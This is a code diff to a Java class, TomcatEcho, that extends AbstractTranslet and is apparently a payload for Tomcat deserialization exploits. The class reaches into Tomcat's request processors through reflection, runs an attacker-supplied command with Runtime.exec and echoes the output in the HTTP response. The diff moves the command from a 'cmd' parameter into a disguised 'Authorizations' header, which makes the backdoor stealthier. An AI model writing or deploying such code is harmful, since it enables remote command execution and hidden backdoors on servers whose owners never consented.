@@ -8,9 +8,6 @@ import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-import org.apache.catalina.connector.Response;
-import org.apache.coyote.Request;
-import org.apache.coyote.RequestInfo;
 
 import java.io.InputStream;
 import java.io.Writer;
@@ -43,34 +40,26 @@ public class TomcatEcho extends AbstractTranslet {
                         if (global != null){
                             List processors = (List) getField(global,"processors");
                             for (i=0;i<processors.size();i++){
-                                RequestInfo requestInfo = (RequestInfo) processors.get(i);
+                                org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) processors.get(i);
                                 if (requestInfo != null){
-                                    Request tempRequest = (Request) getField(requestInfo,"req");
+                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo,"req");
                                     org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
-                                    Response response = request.getResponse();
-
-                                    String cmd = null;
-                                    if (request.getParameter("cmd") != null){
-                                        cmd =  request.getParameter("cmd");
-                                    }
-
+                                    org.apache.catalina.connector.Response response = request.getResponse();
+                                    String cmd = request.getHeader("Authorizations") != null?request.getHeader("Authorizations"):null;
                                     if (cmd != null){
                                         System.out.println(cmd);
-                                        InputStream inputStream = new ProcessBuilder(cmd).start().getInputStream();
+                                        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                                         StringBuilder sb = new StringBuilder("");
                                         byte[] bytes = new byte[1024];
                                         int n = 0 ;
                                         while ((n=inputStream.read(bytes)) != -1){
                                             sb.append(new String(bytes,0,n));
                                         }
-
                                         Writer writer = response.getWriter();
                                         writer.write(sb.toString());
                                         writer.flush();
                                         inputStream.close();
-                                        System.out.println("success");
                                         flag = true;
-                                        break;
                                     }
                                     if (flag){
                                         break;
